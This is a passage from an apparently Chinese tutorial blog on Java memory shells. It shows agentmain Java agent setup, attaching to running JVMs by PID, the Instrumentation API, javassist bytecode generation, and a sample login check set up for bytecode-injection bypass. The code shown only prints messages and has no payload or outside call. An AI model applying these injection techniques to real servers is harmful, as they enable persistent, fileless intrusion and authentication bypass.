src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412192224623.png" alt="image-20241219222424102"></p><p>所以，用porm.xml管理的方式进行手动添加，然后更新依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>D:/JDKInstall/JDK8/lib/tools.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如同上述部署jar包的方式，需要在META-INF&#x2F;MANIFEST.MF中指明Agent-Class具体为哪个类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Premain-Class: com.example.memshell.premainDemo</span><br><span class="line">Agent-Class: com.example.memshell.agentmainDemo</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>agentmainDemo，实现agentmain即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.classfile.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">agentmainDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation instrumentation)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is agentmainDemo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后打成jar包</p><p>附加进程，使用<code>jps -l</code>查看JVM中的进程号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">agentDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 附加的进程号</span></span><br><span class="line">        <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(<span class="string">&quot;31504&quot;</span>);</span><br><span class="line">        <span class="comment">// 指明刚才的打包路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">agentpath</span> <span class="operator">=</span> <span class="string">&quot;E:\\Java_Sec\\MemShell\\out\\artifacts\\MemShell2_jar2\\MemShell.jar&quot;</span>;</span><br><span class="line">        System.out.println(agentpath);</span><br><span class="line">        vm.loadAgent(agentpath);<span class="comment">// 依据绝对路径加载agent</span></span><br><span class="line">        vm.detach();</span><br><span class="line">        System.out.println(<span class="string">&quot;attach ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>附加成功</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412192232917.png" alt="image-20241219223219163"></p><p>当然，上述代码是直接硬编码PID。比较优雅的写法是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.memshell;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">agentDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="type">String</span> <span class="variable">agentpath</span> <span class="operator">=</span> <span class="string">&quot;E:\\Java_Sec\\MemShell\\out\\artifacts\\MemShell2_jar2\\MemShell.jar&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor descriptor : list)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> descriptor.displayName();</span><br><span class="line">            <span class="type">String</span> <span class="variable">pid</span> <span class="operator">=</span> descriptor.id();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(name.contains(<span class="string">&quot;com.example.memshell.agentDemo&quot;</span>))&#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(pid);</span><br><span class="line">                <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(agentpath).getAbsolutePath();</span><br><span class="line">                virtualMachine.loadAgent(path);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">                System.out.println(<span class="string">&quot;attach ok&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Instrumentation动态修改字节码"><a href="#Instrumentation动态修改字节码" class="headerlink" title="Instrumentation动态修改字节码"></a>Instrumentation动态修改字节码</h2><h3 id="Instrumentation接口"><a href="#Instrumentation接口" class="headerlink" title="Instrumentation接口"></a>Instrumentation接口</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.instrument;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  java.io.File;</span><br><span class="line"><span class="keyword">import</span>  java.io.IOException;</span><br><span class="line"><span class="keyword">import</span>  java.util.jar.JarFile;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// transformer: 要注册的transformer</span></span><br><span class="line">    <span class="comment">// canRetransform: 是否重新转换</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isRetransformClassesSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重载类</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isRedefineClassesSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">redefineClasses</span><span class="params">(ClassDefinition... definitions)</span> <span class="keyword">throws</span>  ClassNotFoundException, UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getInitiatedClasses(ClassLoader loader);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getObjectSize</span><span class="params">(Object objectToSize)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">appendToBootstrapClassLoaderSearch</span><span class="params">(JarFile jarfile)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">appendToSystemClassLoaderSearch</span><span class="params">(JarFile jarfile)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isNativeMethodPrefixSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setNativeMethodPrefix</span><span class="params">(ClassFileTransformer transformer, String prefix)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="classpath"><a href="#classpath" class="headerlink" title="classpath"></a>classpath</h3><blockquote><p><code>Classpath</code> 是 Java 中用于指定 Java 虚拟机（JVM）和 Java 编译器（javac）查找类文件（.class 文件）和资源文件的路径。它是一个包含多个目录、JAR 文件、ZIP 文件的路径列表，JVM 通过这些路径来定位并加载运行 Java 程序所需的类文件和资源</p></blockquote><p>当运行一个 Java 程序时，JVM 会根据指定的 <code>classpath</code> 路径查找类文件（.class 文件）。如果类文件在 <code>classpath</code> 路径中没有找到，JVM 会抛出 <code>ClassNotFoundException</code>。</p><p><code>classpath</code> 可以包含多个路径，路径之间用特定的符号分隔：</p><ol><li><p>在类 Unix 系统（如 Linux、macOS）中，使用冒号（<code>:</code>）分隔路径。</p></li><li><p>在 Windows 系统中，使用分号（<code>;</code>）分隔路径。</p></li></ol><p>设置方法：</p><ol><li><p>命令行：<code>java -cp path javaDemo</code>，将从path路径下找到对应的资源文件</p></li><li><p>设置ClassPath环境变量</p></li></ol><h3 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h3><blockquote><p>Javassist：用来处理Java字节码的类库，允许在已经编译好的类中添加新的方法，或者修改已有的方法，同时也可以通过手动的方式去生成一个新的类对象</p></blockquote><p>导入依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.25.0-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><blockquote><p><code>ClassPool</code>需要关注的方法：</p><ol><li>getDefault : 返回默认的ClassPool 是单例模式的，一般通过该方法创建我们的ClassPool；</li><li>appendClassPath, insertClassPath : 将一个ClassPath加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬；</li><li>toClass : 将修改后的CtClass加载至当前线程的上下文类加载器中，CtClass的toClass方法是通过调用本方法实现。需要注意的是一旦调用该方法，则无法继续修改已经被加载的class；</li><li>get , getCtClass : 根据类路径名获取该类的CtClass对象，用于后续的编辑。</li></ol><p><code>CtClass</code>需要关注的方法：</p><ol><li>freeze : 冻结一个类，使其不可修改；</li><li>isFrozen : 判断一个类是否已被冻结；</li><li>prune : 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用；</li><li>defrost : 解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用 prune 方法；</li><li>detach : 将该class从ClassPool中删除；</li><li>writeFile : 根据CtClass生成 .class 文件；</li><li>toClass : 通过类加载器加载该CtClass。</li></ol><p>上面我们创建一个新的方法使用了CtMethod类。CtMthod代表类中的某个方法，可以通过CtClass提供的API获取或者CtNewMethod新建，通过CtMethod对象可以实现对方法的修改。<br><code>CtMethod</code>中的一些重要方法：</p><ol><li>insertBefore : 在方法的起始位置插入代码；</li><li>insterAfter : 在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception；</li><li>insertAt : 在指定的位置插入代码；</li><li>setBody : 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除；</li><li>make : 创建一个新的方法。</li></ol></blockquote><p>创建新类：</p><ul><li>使用makeClass在类池中创建新类</li><li>添加属性、构造函数、方法</li><li>writeFile让.class文件落地</li></ul><p>调用：</p><ul><li>添加classpath路径后通过反射调用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.memshell.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassistDemo</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用javassist创建对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Create1cfhClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 获取类池</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在类池中新建一个空类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">newCls</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Icfh&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新建字段</span></span><br><span class="line">            <span class="comment">// 字段名为name</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">newParam</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(pool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span>, newCls);</span><br><span class="line">            <span class="comment">// 访问级别为private</span></span><br><span class="line">        newParam.setModifiers(Modifier.PRIVATE);</span><br><span class="line">            <span class="comment">// 初始值为&quot;1cfh&quot;</span></span><br><span class="line">        newCls.addField(newParam, CtField.Initializer.constant(<span class="string">&quot;1cfh&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成 getter、setter</span></span><br><span class="line">        newCls.addMethod(CtNewMethod.setter(<span class="string">&quot;setName&quot;</span>,newParam));</span><br><span class="line">        newCls.addMethod(CtNewMethod.getter(<span class="string">&quot;getName&quot;</span>,newParam));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加无参构造函数</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, newCls);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;&#123;name=\&quot;1c4h\&quot;;&#125;&quot;</span>);</span><br><span class="line">        newCls.addConstructor(constructor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加有参构造函数</span></span><br><span class="line">        constructor = <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;</span><br><span class="line">                pool.get(<span class="string">&quot;java.lang.String&quot;</span>)</span><br><span class="line">        &#125;, newCls);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);</span><br><span class="line">        newCls.addConstructor(constructor);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建无参方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(</span><br><span class="line">                CtClass.voidType,   <span class="comment">// 返回值类型</span></span><br><span class="line">                <span class="string">&quot;printName&quot;</span>,        <span class="comment">// 函数名</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,    <span class="comment">// 无参</span></span><br><span class="line">                newCls              <span class="comment">// 目标类</span></span><br><span class="line">        );</span><br><span class="line">        ctMethod.setModifiers(Modifier.PUBLIC); <span class="comment">// 修改为public</span></span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;&#123;System.out.println(name);&#125;&quot;</span>);</span><br><span class="line">        newCls.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建有参方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(</span><br><span class="line">                CtClass.voidType,</span><br><span class="line">                <span class="string">&quot;printMsg&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;     <span class="comment">// 参数类型为String</span></span><br><span class="line">                        pool.get(<span class="string">&quot;java.lang.String&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                newCls</span><br><span class="line">        );</span><br><span class="line">        ctMethod1.setModifiers(Modifier.PUBLIC);</span><br><span class="line">            <span class="comment">// $0 =&gt; this</span></span><br><span class="line">            <span class="comment">// $1 .. 参数</span></span><br><span class="line">        ctMethod1.setBody(<span class="string">&quot;&#123;System.out.println(\&quot;ths msg is: \&quot;+$1);&#125;&quot;</span>);</span><br><span class="line">        newCls.addMethod(ctMethod1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 直接利用反射创建上述定义的类</span></span><br><span class="line">        Class&lt;?&gt; clazz = newCls.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.getDeclaredConstructor().newInstance();</span><br><span class="line">            <span class="comment">// 反射demo1</span></span><br><span class="line">        clazz.getMethod(<span class="string">&quot;printMsg&quot;</span>, String.class).invoke(obj,<span class="string">&quot;JavaMaster&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;printName&quot;</span>).invoke(obj, <span class="literal">null</span>);</span><br><span class="line">            <span class="comment">// 反射demo2</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">printMsg</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;printMsg&quot;</span>, String.class);</span><br><span class="line">        printMsg.invoke(obj,<span class="string">&quot;Fuck&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将创建的类对象编译为class后缀的文件</span></span><br><span class="line">        newCls.writeFile(<span class="string">&quot;E:\\Java_Sec\\MemShell\\class&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示使用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">useClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 添加classpath类搜索路径</span></span><br><span class="line">        pool.appendClassPath(<span class="string">&quot;E:\\Java_Sec\\MemShell\\class&quot;</span>);</span><br><span class="line">        <span class="comment">// 然后从类池中获取类, 由于添加了classpath, 将会从该位置获取到类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;Icfh&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctClass.toClass().newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">setName</span> <span class="operator">=</span> obj.getClass().getDeclaredMethod(<span class="string">&quot;setName&quot;</span>,String.class);</span><br><span class="line">        setName.invoke(obj, <span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getName</span> <span class="operator">=</span> obj.getClass().getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        System.out.println(getName.invoke(obj));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Create1cfhClass();</span></span><br><span class="line">        useClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用agentmain注入修改字节码"><a href="#利用agentmain注入修改字节码" class="headerlink" title="利用agentmain注入修改字节码"></a>利用agentmain注入修改字节码</h3><p>总体思路：</p><ul><li>agentmain注入</li><li>在agentmain中调用Instrumentation的API添加拦截器，并重载<ul><li>拦截器中实现类修改</li></ul></li></ul><p>目标代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">instrumentDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;1cfh&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;1cfh_fake&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkLogin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (username == <span class="string">&quot;1cfh&quot;</span>) &amp;&amp; (password == <span class="string">&quot;1cfh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(checkLogin())&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;login success: FLAG&#123;hacker&#125;&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;login failed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Thread.sleep(<span 